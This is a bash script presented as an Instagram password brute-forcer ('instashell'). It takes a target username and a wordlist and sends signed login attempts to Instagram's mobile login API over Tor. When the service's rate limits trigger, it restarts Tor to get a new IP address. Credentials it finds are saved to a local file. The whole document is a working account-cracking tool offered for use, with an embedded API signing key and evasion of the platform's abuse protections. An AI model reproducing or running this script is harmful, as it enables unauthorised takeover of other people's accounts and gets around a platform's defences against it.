#!/bin/bash
# Coded by: github.com/thelinuxchoice
# Instagram: @thelinuxchoice
trap 'store;exit 1' 2
checkroot() {
if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mPlease, run this program as root!\n\e[0m"
    exit 1
fi
}

dependencies() {

command -v openssl > /dev/null 2>&1 || { echo >&2 "I require openssl but it's not installed. Aborting."; exit 1; }
command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Aborting."; exit 1; }
command -v awk > /dev/null 2>&1 || { echo >&2 "I require awk but it's not installed. Aborting."; exit 1; }
command -v sed > /dev/null 2>&1 || { echo >&2 "I require sed but it's not installed. Aborting."; exit 1; }
command -v cat > /dev/null 2>&1 || { echo >&2 "I require cat but it's not installed. Aborting."; exit 1; }
command -v tr > /dev/null 2>&1 || { echo >&2 "I require tr but it's not installed. Aborting."; exit 1; }
command -v wc > /dev/null 2>&1 || { echo >&2 "I require wc but it's not installed. Aborting."; exit 1; }
command -v cut > /dev/null 2>&1 || { echo >&2 "I require cut but it's not installed. Aborting."; exit 1; }
command -v uniq > /dev/null 2>&1 || { echo >&2 "I require uniq but it's not installed. Aborting."; exit 1; }
if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
echo "/dev/urandom not found!"
exit 1
fi
#command -v head > /dev/null 2>&1 || { echo >&2 "I require head but it's not installed. Aborting."; exit 1; }
#command -v fold > /dev/null 2>&1 || { echo >&2 "I require fold but it's not installed. Aborting."; exit 1; }

}

banner() {

printf "\e[1;92m     _                                   _             _  _           \e[0m\n"
printf "\e[1;92m _  | |                _                | |           | || |          \e[0m\n"
printf "\e[1;92m( \ | | ____    ___  _| |_  _____   ___ | |__   _____ | || |          \e[0m\n"
printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ | /___)|  _ \ | ___ || || |          \e[0m\n"
printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  _____   \e[0m\n"
printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"
printf "\n"
printf "\e[1;77m\e[45m       Instagram Brute Forcer v1.4 Author: github.com/thelinuxchoice\e[0m\n"
printf "\n"
}

function start() {
banner
checkroot
dependencies
read -p $'\e[1;92mUsername account: \e[0m' user
checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "the page may have been removed")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91mInvalid Username! Try again\e[0m\n"
sleep 1
start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
fi
}

checktor() {

check=$(curl --socks5 localhost:9050 -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[1;91mPlease, start TOR!\n\e[0m"
exit 1
fi

}

function store() {

if [[ -n "$pass" ]]; then
default_session="Y"
printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $user
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then

printf "user=\"%s\"\npass=\"%s\"\nwl_pass=\"%s\"\n" $user $pass $wl_pass > store.session.$user.$(date +"%FT%H%M")
printf "\e[1;77mSession saved.\e[0m\n"
printf "\e[1;92mUse ./instashell --resume\n"
else
exit 1
fi
else
exit 1
fi
}


function changeip() {

killall -HUP tor
sleep 3

}

string4=$(openssl rand -hex 32 | tr -d /=+ | cut -c 4)
string8=$(openssl rand -hex 32 | tr -d /=+ | cut -c 8)
string12=$(openssl rand -hex 32 | tr -d /=+ | cut -c 12)
string16=$(openssl rand -hex 32 | tr -d /=+ | cut -c 16)

#string8=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
#string4=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 4 | head -n 1)
#string12=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 12 | head -n 1)
#string16=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 16 | head -n 1)

device="android-$string16"
#uuid=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 32 | head -n 1)
uuid=$(openssl rand -hex 32 | tr -d /=+ | cut -c 32)
phone="$string8-$string4-$string4-$string4-$string12"
guid="$string8-$string4-$string4-$string4-$string12"
var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)


function bruteforcer() {

checktor
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to save session\n\e[0m"
IFS=$'\n'
for pass in $(cat $wl_pass); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"

countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
check=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o '200\|challenge\|many tries\|Please wait' | uniq)

if [[ "$check" == "200" ]]; then
printf "\e[1;92m [*] Password Found: %s \n\e[0m" $pass
printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
exit 1
fi

if [[ "$check" == "challenge" ]]; then
printf "\e[1;92m [*] Password Found: %s\n" $pass
printf "\e[1;92m [*] Challenge required\n"
printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
exit 1
fi


if [[ "$check" == "many tries" ]]; then

printf "\e[1;31m [*] Changing IP Address...\n\e[0m"
changeip 
fi
if [[ "$check" == "Please wait" ]]; then

printf "\e[1;31m [*] Changing IP Address...\n\e[0m"
changeip 
fi

done
}

function resume() {

banner 
checktor
counter=1
printf "\e[1;92mFiles sessions:\n\e[0m"
for list in $(ls store.session*); do
IFS=$'\n'
source $list
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$pass"
let counter++
done
read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
source $(ls store.session* | sed ''$fileresume'q;d')
printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $user
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[*] Press Ctrl + C to save session\n\e[0m"
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
IFS=$'\n'
for pass in $(sed -n '/'$pass'/,$p' $wl_pass); do

header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'

data='{"phone_id":"$phone", "_csrftoken":"$var2", "username":"'$user'", "guid":"$guid", "device_id":"$device", "password":"'$pass'", "login_attempt_count":"0"}'
ig_sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"

countpass=$(grep -n "$pass" "$wl_pass" | cut -d ":" -f1)
hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
check=$(curl --socks5 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o '200\|challenge\|many tries\|Please wait' | uniq)

if [[ "$check" == "200" ]]; then
printf "\e[1;92m [*] Password Found: %s \n\e[0m" $pass
printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
exit 1
fi

if [[ "$check" == "challenge" ]]; then
printf "\e[1;92m [*] Password Found: %s\n" $pass
printf "\e[1;92m [*] Challenge required\n"
printf "Username: %s, Password: %s\n" $user $pass >> found.instashell
printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"
exit 1
fi


if [[ "$check" == "many tries" ]]; then
printf "\e[1;31m [*] Changing IP Address...\n\e[0m"
changeip 
fi

if [[ "$check" == "Please wait" ]]; then
printf "\e[1;31m [*] Changing IP Address...\n\e[0m"
changeip 
fi

done


}

case "$1" in --resume) resume ;; *)
start
bruteforcer
esac

